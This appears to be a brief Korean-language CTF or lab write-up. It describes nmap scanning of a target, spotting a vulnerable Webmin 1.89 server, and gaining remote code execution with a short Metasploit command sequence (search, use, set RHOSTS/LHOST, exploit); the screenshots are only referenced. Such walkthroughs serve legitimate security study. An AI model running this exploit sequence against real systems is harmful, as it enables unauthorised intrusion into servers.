# solve

1. nmap 정보 수집
![[Pasted image 20250724182123.png]]
-> http 웹 서버가 있다. 이때 스크립트 정보 수집에서 robots.txt가 있는 걸 확인.
![[Pasted image 20250725163932.png]]

2. 취약점 진단
![[Pasted image 20250724184628.png]]
-> 이때 MiniServ는 공개된 취약점이 없고 webmin이 공개된 취약점이 많다.
![[Pasted image 20250724184752.png]]
-> 웹 서버 버전인 1.89의 취약점은 위와 같음. 마지막 RCE가 metasploit이니까 msfconsole 이용

3. 취약점 공격
```
msfconsole

search webmin 1.89
use 0
set RHOSTS <IP>
set LHOST <IP>
exploit
```
![[Pasted image 20250725171220.png]]
![[Pasted image 20250725171525.png]]
![[Pasted image 20250725171609.png]]